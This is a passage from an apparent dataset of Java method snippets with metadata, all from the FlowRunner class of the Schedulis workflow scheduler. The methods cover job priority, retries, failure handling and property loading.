// The following nodes are finished, so we'll collect a list of outnodes    // that are candidates for running next.    final HashSet<ExecutableNode> nodesToCheck = new HashSet<>();    for (final ExecutableNode node : this.finishedNodes) {      Set<String> outNodeIds = new HashSet<>();      // FIXME\u00a0If the node status is not FAILED_WAITING, you need to get its external nodes.      if(!node.getStatus().equals(Status.FAILED_WAITING)) {        outNodeIds = node.getOutNodes();      }      ExecutableFlowBase parentFlow = node.getParentFlow();      // If a job is seen as failed or killed due to failing SLA, then we set the parent flow to      // FAILED_FINISHING      // FIXME\u00a0Added judgment conditions. When the task status is FAILED_WAITING, the job flow status must also be changed to the FAILED_FINISHING status.      if ((node.getStatus() == Status.FAILED_WAITING || node.getStatus() == Status.FAILED || (node.getStatus() == Status.KILLED && node              .isKilledBySLA())) && nodeSkipFailedCheck(node)) {        // The job cannot be retried or has run out of retry attempts. We will        // fail the job and its flow now.        if (!retryJobIfPossible(node)) {          setFlowFailed(node);        } else {          nodesToCheck.add(node);          continue;        }      }      if (outNodeIds.isEmpty() && isFlowReadytoFinalize(parentFlow)) {        // Todo jamiesjc: For conditional workflows, if conditionOnJobStatus is ONE_SUCCESS or        // ONE_FAILED, some jobs might still be running when the end nodes have finished. In this        // case, we need to kill all running jobs before finalizing the flow.        finalizeFlow(parentFlow);        finishExecutableNode(parentFlow);        // If the parent has a parent, then we process        if (!(parentFlow instanceof ExecutableFlow)) {          outNodeIds = parentFlow.getOutNodes();          parentFlow = parentFlow.getParentFlow();        }      }      // Add all out nodes from the finished job. We'll check against this set      // to      // see if any are candidates for running.      for (final String nodeId : outNodeIds) {        final ExecutableNode outNode = parentFlow.getExecutableNode(nodeId);        nodesToCheck.add(outNode);      }    }    // FIXME\u00a0New function, run according to the priority set by the node.    boolean openPriority = false;    List<ExecutableNode> priList = new ArrayList<>();    for (final ExecutableNode node : nodesToCheck) {      priList.add(node);      prepareJobProperties(node);      if(node.getInputProps() != null){        String priLevel = node.getInputProps().get(\"priority\");        if(null != priLevel && verifyPriority(priLevel)){          logger.warn(\"\u4efb\u52a1\" + node.getId() + \"\u4f18\u5148\u7ea7\u91c7\u53c2\u6570\u8bbe\u7f6e\u9519\u8bef\uff01\u8bf7\u8bbe\u7f6epriority\u7684\u503c\u4e3a1,2,3,4,5\u8fd95\u4e2a\u6570\u5b57\u4e2d\u7684\u4e00\u4e2a\uff01\");          openPriority = false;          node.getInputProps().put(\"priority\",\"0\");          continue;        }        if(null != priLevel){          openPriority = true;        }      }else {        Props initProps = new Props();        initProps.put(\"priority\", 0);        node.setInputProps(initProps);      }    }    //\u542f\u52a8\u4f18\u5148\u7ea7\u673a\u5236\u6267\u884c\u540c\u4e00\u4e2a\u7236\u8282\u70b9\u4e0b\u9762\u7684Job    if(openPriority){      //\u6309\u4f18\u5148\u7ea7\u6392\u5e8f      Collections.sort(priList, new Comparator<ExecutableNode>() {        @Override        public int compare(ExecutableNode o1, ExecutableNode o2) {          String priFString = o1.getInputProps().get(\"priority\");          String priSString = o2.getInputProps().get(\"priority\");          Integer priF = priFString == null ? 0 : Integer.valueOf(priFString);          Integer priS = priSString == null ? 0 : Integer.valueOf(priSString);          if(priF > priS){            return -1;          }          return 1;        }      });      boolean jobsRun = false;      String preNodeId = \"\";      for (final ExecutableNode node : priList) {        if (notReadyToRun(node.getStatus())) {          // Really shouldn't get in here.          continue;        }        jobsRun |= runReadyJobByPriority(node, preNodeId);        preNodeId = node.getId();      }      if (jobsRun || this.finishedNodes.getSize() > 0) {        updateFlow();        return true;      }    } else {      // Runs candidate jobs. The code will check to see if they are ready to run      // before      // Instant kill or skip if necessary.      boolean jobsRun = false;      for (final ExecutableNode node : nodesToCheck) {        if (notReadyToRun(node.getStatus())) {          // Really shouldn't get in here.          continue;        }        jobsRun |= runReadyJob(node);      }      if (jobsRun || this.finishedNodes.getSize() > 0) {        updateFlow();        return true;      }    }    return false;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "setFlowFailed", "params": ["ExecutableNode"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void setFlowFailed(final ExecutableNode node) {    boolean shouldFail = true;    // As long as there is no outNodes or at least one outNode has conditionOnJobStatus of    // ALL_SUCCESS, we should set the flow to failed. Otherwise, it could still statisfy the    // condition of conditional workflows, so don't set the flow to failed.    for (final String outNodeId : node.getOutNodes()) {      if (node.getParentFlow().getExecutableNode(outNodeId).getConditionOnJobStatus()              .equals(ConditionOnJobStatus.ALL_SUCCESS)) {        shouldFail = true;        break;      } else {        shouldFail = false;      }    }    if (shouldFail) {      propagateStatusAndAlert(node.getParentFlow(),              node.getStatus() == Status.KILLED ? Status.KILLED : Status.FAILED_FINISHING);      if (this.failureAction == FailureAction.CANCEL_ALL) {        this.kill();      }      //\u8282\u70b9\u72b6\u6001\u662fFAILED_WAITING\u4e0d\u80fd\u5c06flow\u7f6e\u4e3afailed      if(!node.getStatus().equals(Status.FAILED_WAITING)) {        this.flowFailed = true;      }    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "notReadyToRun", "params": ["Status"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "  private boolean notReadyToRun(final Status status) {    return Status.isStatusFinished(status)            || Status.isStatusRunning(status)            || Status.KILLING == status;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "runReadyJob", "params": ["ExecutableNode"], "throws": ["IOException"], "modifiers": ["private"], "return_type": "boolean", "snippet": "  private boolean runReadyJob(final ExecutableNode node) throws IOException {    if (Status.isStatusFinished(node.getStatus())            || Status.isStatusRunning(node.getStatus())) {      return false;    }    final Status nextNodeStatus = getImpliedStatus(node, this.flow.getOtherOption());    if (nextNodeStatus == null) {      return false;    }    if (nextNodeStatus == Status.CANCELLED) {      this.logger.info(\"Cancelling '\" + node.getNestedId()              + \"' due to prior errors.\");      node.cancelNode(System.currentTimeMillis());      finishExecutableNode(node);    } else if (nextNodeStatus == Status.SKIPPED) {      this.logger.info(\"Skipping disabled job '\" + node.getId() + \"'.\");      node.skipNode(System.currentTimeMillis());      finishExecutableNode(node);    } else if (nextNodeStatus == Status.FAILED_SKIPPED) {      this.logger.info(\"Failed skipped job '\" + node.getId() + \"'.\");      node.faliedSkipedNode(System.currentTimeMillis());      finishExecutableNode(node);    }else if (nextNodeStatus == Status.READY) {      if (node instanceof ExecutableFlowBase) {        final ExecutableFlowBase flow = ((ExecutableFlowBase) node);        this.logger.info(\"baseFlow :\" + flow.getFlowId() + \" , \" + flow.getId() + \" Running flow '\" + flow.getNestedId() + \"'.\");        flow.setStatus(Status.RUNNING);        flow.setStartTime(System.currentTimeMillis());        prepareJobProperties(flow);        for (final String startNodeId : ((ExecutableFlowBase) node).getStartNodes()) {          final ExecutableNode startNode = flow.getExecutableNode(startNodeId);          runReadyJob(startNode);        }      } else {        runExecutableNode(node);      }    }    return true;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "retryJobIfPossible", "params": ["ExecutableNode"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "  private boolean retryJobIfPossible(final ExecutableNode node) {    if (node instanceof ExecutableFlowBase) {      return false;    }    if (node.getRetries() > node.getAttempt()) {      this.logger.info(\"Job '\" + node.getId() + \"' will be retried. Attempt \"              + node.getAttempt() + \" of \" + node.getRetries());      node.setDelayedExecution(node.getRetryBackoff());      node.resetForRetry();      return true;    } else {      if (node.getRetries() > 0) {        this.logger.info(\"Job '\" + node.getId() + \"' has run out of retry attempts\");        // Setting delayed execution to 0 in case this is manually re-tried.        node.setDelayedExecution(0);      }      return false;    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "propagateStatusAndAlert", "params": ["ExecutableFlowBase", "Status"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void propagateStatusAndAlert(final ExecutableFlowBase base, final Status status) {    if (!Status.isStatusFinished(base.getStatus()) && base.getStatus() != Status.KILLING) {      this.logger.info(\"Setting \" + base.getNestedId() + \" to \" + status);      boolean shouldAlert = false;      if (base.getStatus() != status) {        base.setStatus(status);        shouldAlert = true;      }      if (base.getParentFlow() != null) {        propagateStatusAndAlert(base.getParentFlow(), status);      } else if (this.azkabanProps.getBoolean(ConfigurationKeys.AZKABAN_POLL_MODEL, false)) {        // Alert on the root flow if the first error is encountered.        // Todo jamiesjc: Add a new FLOW_STATUS_CHANGED event type and alert on that event.        if (shouldAlert && base.getStatus() == Status.FAILED_FINISHING) {          ExecutionControllerUtils.alertUserOnFirstError((ExecutableFlow) base, this.alerterHolder);        }      }    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "finishExecutableNode", "params": ["ExecutableNode"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void finishExecutableNode(final ExecutableNode node) {    this.finishedNodes.add(node);    final EventData eventData = new EventData(node.getStatus(), node.getNestedId());    fireEventListeners(Event.create(this, EventType.JOB_FINISHED, eventData));  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "isFlowReadytoFinalize", "params": ["ExecutableFlowBase"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "  private boolean isFlowReadytoFinalize(final ExecutableFlowBase flow) {    // Only when all the end nodes are finished, the flow is ready to finalize.    for (final String end : flow.getEndNodes()) {      if (!Status.isStatusFinished(flow.getExecutableNode(end).getStatus())) {        return false;      }    }    return true;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "finalizeFlow", "params": ["ExecutableFlowBase"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void finalizeFlow(final ExecutableFlowBase flow) {    // FIXME\u00a0If it is ExecutableFlow, id is the name of the job flow.    final String id = flow == this.flow ? flow.getFlowId() : flow.getNestedId();    // If it's not the starting flow, we'll create set of output props    // for the finished flow.    boolean succeeded = true;    Props previousOutput = null;    //\u6700\u540e\u4e00\u4e2a\u8282\u70b9\u6210\u529f\u5c31\u80fd\u786e\u4fdd\u4f5c\u4e1a\u6d41\u6210\u529f\uff1f    for (final String end : flow.getEndNodes()) {      final ExecutableNode node = flow.getExecutableNode(end);      if (node.getStatus() == Status.KILLED              || node.getStatus() == Status.KILLING              || node.getStatus() == Status.FAILED              || node.getStatus() == Status.CANCELLED) {        succeeded = false;      }      // FIXME\u00a0Solve the problem that the last node of the sub-job stream fails to be set, and the sub-job stream is still failed.      List<String> skipFaultJobList = (ArrayList)this.flow.getOtherOption().get(\"jobSkipFailedOptions\");      if (null != skipFaultJobList && (skipFaultJobList.contains(node.getNestedId()) || skipFaultJobList.contains(node.getId()))) {        logger.info(\"\u7528\u6237\u5df2\u8bbe\u7f6e\u9519\u8bef\u8df3\u8fc7\u7b56\u7565\uff0c\u8df3\u8fc7\u9519\u8bef\u72b6\u6001 Job:\" + node.getNestedId() + \" \u7ee7\u7eed\u6267\u884c\u3002\");        succeeded = true;      }      Props output = node.getOutputProps();      if (output != null) {        output = Props.clone(output);        output.setParent(previousOutput);        previousOutput = output;      }    }    //\u4fdd\u8bc1\u6bcf\u4e2a\u8282\u70b9\u90fd\u662f\u6210\u529f\u4f5c\u4e1a\u6d41\u624d\u662f\u6210\u529f    // FIXME\u00a0The flow 1.0 scenario needs to ensure that each task in the job stream is successful before the job stream is executed successfully.    if(!FlowLoaderUtils.isAzkabanFlowVersion20(this.flow.getAzkabanFlowVersion())) {      for (ExecutableNode executableNode : flow.getExecutableNodes()) {        if (Status.isStatusFailed(executableNode.getStatus()) || executableNode.getStatus().equals(Status.KILLING)) {          logger.warn(\"job: \" + executableNode.getNestedId() + \" is not succeesed.\");          succeeded = false;          break;        }      }    }    flow.setOutputProps(previousOutput);    if (!succeeded && (flow.getStatus() == Status.RUNNING)) {      flow.setStatus(Status.KILLED);    }    flow.setEndTime(System.currentTimeMillis());    flow.setUpdateTime(System.currentTimeMillis());    final long durationSec = (flow.getEndTime() - flow.getStartTime()) / 1000;    switch (flow.getStatus()) {      case FAILED_FINISHING:        this.logger.info(\"Setting flow '\" + id + \"' status to FAILED in \"                + durationSec + \" seconds\");        flow.setStatus(Status.FAILED);        break;      case KILLING:        this.logger                .info(\"Setting flow '\" + id + \"' status to KILLED in \" + durationSec + \" seconds\");        flow.setStatus(Status.KILLED);        break;      case FAILED:      case KILLED:      case CANCELLED:      case FAILED_SUCCEEDED:        this.logger.info(\"Flow '\" + id + \"' is set to \" + flow.getStatus().toString()                + \" in \" + durationSec + \" seconds\");        break;      default:        flow.setStatus(Status.SUCCEEDED);        this.logger.info(\"Flow '\" + id + \"' is set to \" + flow.getStatus().toString()                + \" in \" + durationSec + \" seconds\");    }    // If the finalized flow is actually the top level flow, than we finish    // the main loop.    if (flow instanceof ExecutableFlow) {      this.flowFinished = true;    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "prepareJobProperties", "params": ["ExecutableNode"], "throws": ["IOException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void prepareJobProperties(final ExecutableNode node) throws IOException {    if (node instanceof ExecutableFlow) {      return;    }    Props props = null;    if (!FlowLoaderUtils.isAzkabanFlowVersion20(this.flow.getAzkabanFlowVersion())) {      // 1. Shared properties (i.e. *.properties) for the jobs only. This takes      // the      // least precedence      if (!(node instanceof ExecutableFlowBase)) {        // \u8fd4\u56deproperties\u91cc\u7684\u914d\u7f6e        final String sharedProps = node.getPropsSource();        if (sharedProps != null) {          props = Props.clone(this.sharedProps.get(sharedProps));        }      }    }    // The following is the hiearchical ordering of dependency resolution    // 2. Parent Flow Properties    final ExecutableFlowBase parentFlow = node.getParentFlow();    if (parentFlow != null) {      final Props flowProps = Props.clone(parentFlow.getInputProps());      flowProps.setEarliestAncestor(props);      props = flowProps;    }    /**     *     2.1 if it is a subflow,we need to put baseflow's executionOption to props     *     ns_wtss is a namespace param ,if it is false ,the last outputParam is not     *     a global variable     */    // FIXME\u00a0Add global variables output by the task to props.    if(props != null){      props.putAll(this.flow.getExecutionOptions().getFlowParameters());      props.putAll(this.flow.getJobOutputGlobalParam());    }    // 3.job Output Properties. The call creates a clone, so we can overwrite it.    final Props outputProps = collectOutputProps(node);    Props tmpOutputProps = null;    if (outputProps != null && outputProps.size() != 0) {      tmpOutputProps = Props.clone(outputProps);      outputProps.setEarliestAncestor(props);      props = outputProps;    }    // 4. The job source.    final Props jobSource = loadJobProps(node);    if (jobSource != null) {      jobSource.setParent(props);      props = jobSource;    }    // \u53ea\u6709\u5b57job\u624d\u80fd\u6709\u7528\u6237\u53c2\u6570\uff0c\u5b50flow\u4e0d\u53ef\u4ee5\uff0c\u5982\u679c\u8be5\u7528\u6237\u5b58\u6709\u7528\u6237\u914d\u7f6e\uff0c \u5c06\u7528\u6237\u914d\u7f6e\u8bbe\u7f6e\u4e3aproperties\u914d\u7f6e\u7684\u7956\u7236\u7ea7\u914d\u7f6e    // FIXME\u00a0Add user global parameters to Props.    if((!(node instanceof ExecutableFlowBase)) && this.flow.getUserProps() != null && this.flow.getUserProps().size() != 0) {      Props userProps = new Props();      userProps.putAll(this.flow.getUserProps());      //\u5982\u679c\u6709properties\u914d\u7f6e\uff0c\u8bbe\u7f6e\u4e3aprop\u7684\u7956\u7236\u7ea7\u914d\u7f6e      if (props != null) {        props.setEarliestAncestor(userProps);      }    }    // \u5168\u5c40\u53d8\u91cf\u5f00\u5173    String allFlag = props.getString(\"ns_wtss\",\"true\");    if (tmpOutputProps != null) {      if (!\"false\".equals(allFlag)) {        setAllVar(tmpOutputProps);      }    }    // FIXME\u00a0Add some execution parameters to props, such as failed retry tasks, failed skip tasks, etc.    setExecutionProps(node, props);    // FIXME\u00a0Add workflow execution root directory to props.    props.put(\"flow.dir\", this.execDir.getAbsolutePath());    node.setInputProps(props);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "setExecutionProps", "params": ["ExecutableNode", "Props"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void setExecutionProps(ExecutableNode node, Props props){    // 1\u3001\u662f\u5426\u8bbe\u7f6e\u4e86\u8df3\u8fc7\u6240\u6709job    // 2\u3001job\u8bbe\u7f6e\u4e86\u5931\u8d25\u8df3\u8fc7\uff0c \u901a\u8fc7\u914d\u7f6e\u4e13\u9012\u7ed9job\u8fd0\u884c    List<String> skipFaultJobList = (ArrayList) this.flow.getOtherOption().get(\"jobSkipFailedOptions\");    if(this.flow.getFailedSkipedAllJobs() || (skipFaultJobList != null && skipFaultJobList.contains(node.getId()))){      logger.info(\"execId: \" + this.flow.getExecutionId() + \", node: \" +  node.getId() + \", \u8bbe\u7f6e\u4e86\u5931\u8d25\u8df3\u8fc7.\");      props.put(\"azkaban.jobSkipFailed\", node.getId());    }    //\u8bbe\u7f6e\u4e86\u5931\u8d25\u6682\u505c \u5f53job\u5931\u8d25\u65f6\u72b6\u6001\u6539\u4e3aFAILED_WAITING    if(FlowRunner.this.failureAction == FailureAction.FAILED_PAUSE){      logger.debug(\"execId: \" + this.flow.getExecutionId() + \"\uff0c \u8bbe\u7f6e\u4e86\u5931\u8d25\u6682\u505c\u3002\");      props.put(\"azkaban.failureAction\", FailureAction.FAILED_PAUSE.toString());    }    //\u83b7\u53d6\u5931\u8d25\u91cd\u8dd1\u914d\u7f6e\u5e76\u6dfb\u52a0\u5230 Job \u7684\u914d\u7f6e\u5185\u5bb9\u4e2d    if(null != this.flow.getOtherOption().get(\"jobFailedRetryOptions\")){      List<Map<String, String>> jobFailedRetryOptions = (List<Map<String, String>>)this.flow.getOtherOption().get(\"jobFailedRetryOptions\");      for(Map<String, String> map : jobFailedRetryOptions){        if(node.getId().equals(map.get(\"jobName\"))){          props.put(\"job.failed.retry.interval\", map.get(\"interval\"));          props.put(\"job.failed.retry.count\", map.get(\"count\"));        }      }    }    // \u8bbe\u7f6e\u91ccflow\u5931\u8d25\u91cd\u8dd1\uff0c\u6240\u6709job\u90fd\u8981\u7ee7\u627f\u8be5\u914d\u7f6e    Map<String, String> flowFailedRetryOption = this.flow.getFlowFailedRetry();    if(flowFailedRetryOption != null && flowFailedRetryOption.size() != 0){      Props flowFailedRetryProps = new Props(null);      flowFailedRetryProps.putAll(flowFailedRetryOption);      props.setEarliestAncestor(flowFailedRetryProps);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "setAllVar", "params": ["Props"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void setAllVar(Props outputProps){//    this.flow.getExecutionOptions().getFlowParameters().putAll(outputProps.getFlattened());    this.flow.addJobOutputGlobalParam(new ConcurrentHashMap<>(outputProps.getFlattened()));    this.flow.getInputProps().putAll(outputProps);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "customizeJobProperties", "params": ["Props"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void customizeJobProperties(final Props props) {    final boolean memoryCheck = this.flow.getExecutionOptions().getMemoryCheck();    props.put(ProcessJob.AZKABAN_MEMORY_CHECK, Boolean.toString(memoryCheck));  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "loadJobProps", "params": ["ExecutableNode"], "throws": ["IOException"], "modifiers": ["private"], "return_type": "Props", "snippet": "  private Props loadJobProps(final ExecutableNode node) throws IOException {    Props props = null;    if (FlowLoaderUtils.isAzkabanFlowVersion20(this.flow.getAzkabanFlowVersion())) {      final String jobPath =              node.getParentFlow().getFlowId() + Constants.PATH_DELIMITER + node.getId();      props = loadPropsFromYamlFile(jobPath);      if (props == null) {        this.logger.info(\"Job props loaded from yaml file is empty for job \" + node.getId());        return props;      }    } else {      final String source = node.getJobSource();      if (source == null) {        return null;      }      // load the override props if any      try {        props =                this.projectLoader.fetchProjectProperty(this.flow.getProjectId(),                        this.flow.getVersion(), node.getId() + Constants.JOB_OVERRIDE_SUFFIX);      } catch (final ProjectManagerException e) {        e.printStackTrace();        this.logger.error(\"Error loading job override property for job \"                + node.getId());      }      final File path = new File(this.execDir, source);      if (props == null) {        // if no override prop, load the original one on disk        try {          props = new Props(null, path);        } catch (final IOException e) {          e.printStackTrace();          this.logger.error(\"Error loading job file \" + source + \" for job \"                  + node.getId());        }      }      // setting this fake source as this will be used to determine the location      // of log files.      if (path.getPath() != null) {        props.setSource(path.getPath());      }    }    customizeJobProperties(props);    return props;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "loadPropsFromYamlFile", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "Props", "snippet": "  private Props loadPropsFromYamlFile(final String path) {    File tempDir = null;    Props props = null;    try {      tempDir = Files.createTempDir();      props = FlowLoaderUtils.getPropsFromYamlFile(path, getFlowFile(tempDir));    } catch (final Exception e) {      this.logger.error(\"Failed to get props from flow file. \" + e);    } finally {      if (tempDir != null && tempDir.exists()) {        try {          FileUtils.deleteDirectory(tempDir);        } catch (final IOException e) {          this.logger.error(\"Failed to delete temp directory.\" + e);          tempDir.deleteOnExit();        }      }    }    return props;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "getFlowFile", "params": ["File"], "throws": ["Exception"], "modifiers": ["private"], "return_type": "File", "snippet": "  private File getFlowFile(final File tempDir) throws Exception {    final List<FlowProps> flowPropsList = ImmutableList.copyOf(this.flow.getFlowProps());    // There should be exact one source (file name) for each flow file.    if (flowPropsList.isEmpty() || flowPropsList.get(0) == null) {      throw new ProjectManagerException(              \"Failed to get flow file source. Flow props is empty for \" + this.flow.getId());    }    final String source = flowPropsList.get(0).getSource();    List<File> files = new ArrayList<>();    // FIXME\u00a0Instead, get the '.flow' file from the workingdir directory and copy it to the tmp directory. Resolving the run_date variable substitution in the yaml file does not take effect.    FileIOUtils.findFile(this.execDir, source, files);    File flowFile = new File(tempDir, source);    if(files.size() != 0){      FileUtils.copyFile(files.get(0), flowFile);    } else {      logger.error(\"can not found \" + source + \" file at \" + this.execDir.getAbsoluteFile());      throw new Exception(\"can not found \" + source + \" file at \" + this.execDir.getAbsoluteFile());    }    return flowFile;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "runExecutableNode", "params": ["ExecutableNode"], "throws": ["IOException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void runExecutableNode(final ExecutableNode node) throws IOException {    // Collect output props from the job's dependencies.    prepareJobProperties(node);    node.setStatus(Status.QUEUED);    final JobRunner runner = createJobRunner(node);    this.logger.info(\"Submitting job '\" + node.getNestedId() + \"' to run.\");    try {      // FIXME\u00a0Submit datachecker and eventchecker tasks to the executorServiceForCheckers thread pool to run.      if(node.getType().equals(\"datachecker\") || node.getType().equals(\"eventchecker\")){        this.executorServiceForCheckers.execute(runner);      }else {        this.executorService.execute(runner);      }      this.activeJobRunners.add(runner);    } catch (final RejectedExecutionException e) {      this.logger.error(e);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "getImpliedStatus", "params": ["ExecutableNode"], "throws": null, "modifiers": ["public"], "return_type": "Status", "snippet": "  public Status getImpliedStatus(final ExecutableNode node) {    // If it's running or finished with 'SUCCEEDED', than don't even    // bother starting this job.    if (Status.isStatusRunning(node.getStatus())            || node.getStatus() == Status.SUCCEEDED) {      return null;    }    // Go through the node's dependencies. If all of the previous job's    // statuses is finished and not FAILED or KILLED, than we can safely    // run this job.    Status status = Status.READY;    // Check if condition on job status is satisfied    switch (checkConditionOnJobStatus(node)) {      case FAILED:        this.logger.info(\"Condition on job status: \" + node.getConditionOnJobStatus() + \" is \"                + \"evaluated to false for \" + node.getId());        status = Status.CANCELLED;        break;      // Condition not satisfied yet, need to wait      case PENDING:        return null;      default:        break;    }    if (status != Status.CANCELLED && !isConditionOnRuntimeVariableMet(node)) {      status = Status.CANCELLED;    }    // If it's disabled but ready to run, we want to make sure it continues    // being disabled.    if (node.getStatus() == Status.DISABLED            || node.getStatus() == Status.SKIPPED) {      return Status.SKIPPED;    }    // If the flow has failed, and we want to finish only the currently running    // jobs, we just    // kill everything else. We also kill, if the flow has been cancelled.    if (this.flowFailed            && this.failureAction == ExecutionOptions.FailureAction.FINISH_CURRENTLY_RUNNING) {      return Status.CANCELLED;    } else if (isKilled()) {      return Status.CANCELLED;    }    return status;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "isConditionOnRuntimeVariableMet", "params": ["ExecutableNode"], "throws": null, "modifiers": ["private"], "return_type": "Boolean", "snippet": "  private Boolean isConditionOnRuntimeVariableMet(final ExecutableNode node) {    final String condition = node.getCondition();    if (condition == null) {      return true;    }    String replaced = condition;    // Replace the condition on job status macro with \"true\" to skip the evaluation by Script    // Engine since it has already been evaluated.    final Matcher jobStatusMatcher = CONDITION_ON_JOB_STATUS_PATTERN.matcher            (condition);    if (jobStatusMatcher.find()) {      replaced = condition.replace(jobStatusMatcher.group(1), \"true\");    }    final Matcher variableMatcher = CONDITION_VARIABLE_REPLACEMENT_PATTERN.matcher(replaced);    while (variableMatcher.find()) {      final String value = findValueForJobVariable(node, variableMatcher.group(1),              variableMatcher.group(2));      if (value != null) {        replaced = replaced.replace(variableMatcher.group(), \"'\" + value + \"'\");      }      this.logger.info(\"Resolved condition of \" + node.getId() + \" is \" + replaced);    }    // Evaluate string expression using script engine    return evaluateExpression(replaced);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "findValueForJobVariable", "params": ["ExecutableNode", "String", "String"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "  private String findValueForJobVariable(final ExecutableNode node, final String jobName, final  String variable) {    // Get job output props    final ExecutableNode target = node.getParentFlow().getExecutableNode(jobName);    if (target == null) {      this.logger.error(\"Not able to load props from output props file, job name \" + jobName              + \" might be invalid.\");      return null;    }    final Props outputProps = target.getOutputProps();    if (outputProps != null && outputProps.containsKey(variable)) {      return outputProps.get(variable);    }    return null;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": 